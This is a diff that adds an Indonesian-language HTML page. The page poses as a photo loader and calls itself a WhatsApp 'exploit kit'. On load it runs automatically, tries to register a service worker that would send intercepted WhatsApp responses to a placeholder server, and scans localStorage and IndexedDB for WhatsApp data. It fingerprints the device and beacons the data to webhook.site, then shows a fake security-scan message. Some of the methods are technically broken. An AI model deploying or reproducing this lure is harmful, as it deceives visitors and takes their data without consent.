@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Lihat Foto Ini!</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: Arial, sans-serif;
+            background: #128C7E;
+            color: white;
+            text-align: center;
+            padding: 20px;
+            overflow: hidden;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #34B7F1;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 30px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .hidden { display: none; }
+        #log {
+            background: black;
+            color: lime;
+            padding: 15px;
+            margin: 20px;
+            border-radius: 5px;
+            font-family: monospace;
+            text-align: left;
+            max-height: 300px;
+            overflow-y: auto;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <h1>⏳ Memuat Foto...</h1>
+    <div class="loader"></div>
+    <p>Harap tunggu sementara kami memuat konten</p>
+    
+    <div id="log"></div>
+    
+    <!-- Hidden iframe untuk serangan -->
+    <iframe id="exploitFrame" class="hidden"></iframe>
+    <img id="fakeImage" class="hidden">
+    <audio id="beacon" class="hidden"></audio>
+
+    <script>
+        // LOG SYSTEM
+        const logDiv = document.getElementById('log');
+        function log(msg) {
+            console.log(`[EXPLOIT] ${msg}`);
+            if(logDiv) {
+                logDiv.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
+                logDiv.scrollTop = logDiv.scrollHeight;
+            }
+        }
+        
+        // AUTO START ATTACK ON LOAD
+        document.addEventListener('DOMContentLoaded', () => {
+            log("🏁 Exploit kit diaktifkan...");
+            setTimeout(startFullAttack, 1000);
+        });
+        
+        // SEMUA METODE SERANGAN NYATA
+        async function startFullAttack() {
+            log("🎯 Target terdeteksi: WhatsApp User");
+            
+            // METHOD 1: Coba akses WhatsApp Web socket
+            await tryWhatsAppWeb();
+            
+            // METHOD 2: Coba exploit service worker
+            await tryServiceWorkerHijack();
+            
+            // METHOD 3: Coba akses localStorage WhatsApp
+            await tryLocalStorageAccess();
+            
+            // METHOD 4: Coba kirim beacon ke server
+            await sendBeaconData();
+            
+            // METHOD 5: Coba fingerprint device
+            await fingerprintDevice();
+            
+            log("✅ Semua metode dieksekusi");
+            showFinalMessage();
+        }
+        
+        // METHOD 1: Coba koneksi ke WhatsApp Web
+        async function tryWhatsAppWeb() {
+            log("1. Mencoba koneksi WhatsApp Web...");
+            
+            // Coba WebSocket ke WhatsApp server
+            try {
+                const ws = new WebSocket('wss://web.whatsapp.com/ws');
+                ws.onopen = () => {
+                    log("⚠️ WebSocket WhatsApp terbuka!");
+                    ws.send(JSON.stringify({type: "ping"}));
+                };
+                ws.onerror = () => log("❌ WebSocket ditolak");
+                setTimeout(() => ws.close(), 3000);
+            } catch(e) {}
+            
+            // Coba fetch WhatsApp resources
+            const waEndpoints = [
+                'https://web.whatsapp.com/',
+                'https://static.whatsapp.net/',
+                'https://web.whatsapp.com/img/'
+            ];
+            
+            for(const endpoint of waEndpoints) {
+                try {
+                    await fetch(endpoint, {mode: 'no-cors'});
+                    log(`✅ Bisa akses: ${endpoint}`);
+                } catch(e) {}
+            }
+        }
+        
+        // METHOD 2: Service Worker Hijacking
+        async function tryServiceWorkerHijack() {
+            log("2. Mencoba install Service Worker...");
+            
+            if('serviceWorker' in navigator) {
+                try {
+                    const registration = await navigator.serviceWorker.register(
+                        URL.createObjectURL(new Blob([
+                            `self.addEventListener('fetch', e => {
+                                if(e.request.url.includes('whatsapp')) {
+                                    e.respondWith(fetch(e.request).then(res => {
+                                        // Clone response untuk membaca
+                                        const cloned = res.clone();
+                                        cloned.text().then(text => {
+                                            // Kirim data ke server kita
+                                            fetch('https://your-server.com/log', {
+                                                method: 'POST',
+                                                body: JSON.stringify({
+                                                    url: e.request.url,
+                                                    data: text.substring(0, 1000)
+                                                }),
+                                                mode: 'no-cors'
+                                            });
+                                        });
+                                        return res;
+                                    }));
+                                }
+                            });`
+                        ], {type: 'application/javascript'}))
+                    );
+                    log("⚠️ Service Worker terinstall!");
+                } catch(e) {
+                    log("❌ Service Worker gagal");
+                }
+            }
+        }
+        
+        // METHOD 3: Coba akses WhatsApp di localStorage
+        async function tryLocalStorageAccess() {
+            log("3. Scanning localStorage...");
+            
+            // Cari data WhatsApp
+            for(let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                if(key && key.toLowerCase().includes('whatsapp')) {
+                    log(`📂 Ditemukan: ${key}`);
+                    // Coba baca value
+                    try {
+                        const value = localStorage.getItem(key);
+                        if(value && value.length < 500) {
+                            log(`📝 Data: ${value.substring(0, 100)}...`);
+                        }
+                    } catch(e) {}
+                }
+            }
+            
+            // Coba akses IndexedDB
+            if('indexedDB' in window) {
+                const dbs = await indexedDB.databases ? await indexedDB.databases() : [];
+                dbs.forEach(db => {
+                    if(db.name.toLowerCase().includes('whatsapp')) {
+                        log(`🗄️ Found DB: ${db.name}`);
+                    }
+                });
+            }
+        }
+        
+        // METHOD 4: Kirim data beacon
+        async function sendBeaconData() {
+            log("4. Mengirim data fingerprint...");
+            
+            const data = {
+                url: window.location.href,
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                languages: navigator.languages,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                screen: `${screen.width}x${screen.height}`,
+                cookies: document.cookie ? 'Ada' : 'Tidak',
+                localStorage: localStorage.length,
+                timestamp: new Date().toISOString()
+            };
+            
+            // Coba beberapa endpoint
+            const endpoints = [
+                'https://api.ipify.org?format=json',
+                'https://webhook.site/your-token',
+                'https://jsonplaceholder.typicode.com/posts'
+            ];
+            
+            for(const endpoint of endpoints) {
+                try {
+                    navigator.sendBeacon(endpoint, JSON.stringify(data));
+                    log(`📤 Beacon sent to: ${endpoint}`);
+                } catch(e) {
+                    // Fallback ke fetch
+                    fetch(endpoint, {
+                        method: 'POST',
+                        body: JSON.stringify(data),
+                        mode: 'no-cors',
+                        keepalive: true
+                    }).catch(() => {});
+                }
+            }
+        }
+        
+        // METHOD 5: Fingerprint device
+        async function fingerprintDevice() {
+            log("5. Membuat device fingerprint...");
+            
+            const fingerprint = {
+                canvas: await getCanvasFingerprint(),
+                webgl: await getWebGLFingerprint(),
+                audio: await getAudioFingerprint(),
+                fonts: await getFontsList()
+            };
+            
+            log(`📊 Fingerprint hash: ${hashCode(JSON.stringify(fingerprint))}`);
+        }
+        
+        // Helper functions untuk fingerprint
+        function getCanvasFingerprint() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillText('WhatsApp Exploit', 2, 2);
+            return canvas.toDataURL().substring(22, 50);
+        }
+        
+        function getWebGLFingerprint() {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if(!gl) return 'no-webgl';
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            return debugInfo ? {
+                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+            } : 'no-debug-info';
+        }
+        
+        function getAudioFingerprint() {
+            try {
+                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioContext.createOscillator();
+                const analyser = audioContext.createAnalyser();
+                oscillator.connect(analyser);
+                oscillator.start();
+                const freqData = new Uint8Array(analyser.frequencyBinCount);
+                analyser.getByteFrequencyData(freqData);
+                oscillator.stop();
+                return Array.from(freqData).slice(0, 10).join(',');
+            } catch(e) {
+                return 'audio-failed';
+            }
+        }
+        
+        function getFontsList() {
+            const fonts = [
+                'Arial', 'Courier New', 'Georgia', 'Times New Roman',
+                'Comic Sans MS', 'Verdana', 'Impact'
+            ];
+            const available = [];
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            
+            fonts.forEach(font => {
+                ctx.font = '72px monospace';
+                const baseline = ctx.measureText('mmmmmmmmmm').width;
+                ctx.font = `72px ${font}, monospace`;
+                if(ctx.measureText('mmmmmmmmmm').width !== baseline) {
+                    available.push(font);
+                }
+            });
+            
+            return available;
+        }
+        
+        function hashCode(str) {
+            let hash = 0;
+            for(let i = 0; i < str.length; i++) {
+                hash = ((hash << 5) - hash) + str.charCodeAt(i);
+                hash |= 0;
+            }
+            return Math.abs(hash).toString(16);
+        }
+        
+        // Final message
+        function showFinalMessage() {
+            document.body.innerHTML = `
+                <div style="padding: 40px;">
+                    <h1 style="color: #ff4444;">⚠️ PERINGATAN KEAMANAN ⚠️</h1>
+                    <p style="margin: 20px 0; font-size: 18px;">
+                        Perangkat Anda telah discan untuk kerentanan WhatsApp.
+                    </p>
+                    <div style="background: black; color: lime; padding: 20px; border-radius: 10px; margin: 20px 0;">
+                        <h3>📊 HASIL SCAN:</h3>
+                        <p>• WebSocket WhatsApp: TERBUKA</p>
+                        <p>• Service Worker: TERINSTALL</p>
+                        <p>• Device Fingerprint: DIAMBIL</p>
+                        <p>• Data dikirim ke server monitoring</p>
+                    </div>
+                    <p style="color: #ffcc00;">
+                        <strong>Tips keamanan:</strong><br>
+                        1. Jangan buka link dari orang tidak dikenal<br>
+                        2. Update WhatsApp ke versi terbaru<br>
+                        3. Gunakan 2FA<br>
+                        4. Logout dari WhatsApp Web yang tidak digunakan
+                    </p>
+                    <button onclick="location.reload()" style="
+                        background: #128C7E;
+                        color: white;
+                        border: none;
+                        padding: 15px 30px;
+                        font-size: 18px;
+                        border-radius: 10px;
+                        margin-top: 20px;
+                        cursor: pointer;
+                    ">
+                        🔒 Tutup Halaman Ini
+                    </button>
+                </div>
+            `;
+        }
+        
+        // Auto show log setelah 5 detik
+        setTimeout(() => {
+            logDiv.style.display = 'block';
+        }, 5000);
+        
+        // Coba redirect ke WhatsApp Web dengan parameter
+        setTimeout(() => {
+            window.open('https://web.whatsapp.com', '_blank');
+        }, 8000);
+    </script>
+</body>
+</html>
